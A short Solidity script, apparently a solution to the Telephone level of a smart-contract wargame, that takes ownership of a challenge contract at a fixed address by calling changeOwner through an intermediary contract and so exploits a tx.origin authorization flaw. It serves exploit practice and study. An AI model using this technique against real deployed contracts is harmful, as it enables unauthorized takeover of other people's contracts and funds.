// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";

contract Solve {
    function run() external {
        Telephone telephone = Telephone(0xF434C1297E95d8DA01F6748136F00b0bF8c7e882);
        telephone.changeOwner(tx.origin);
    }
}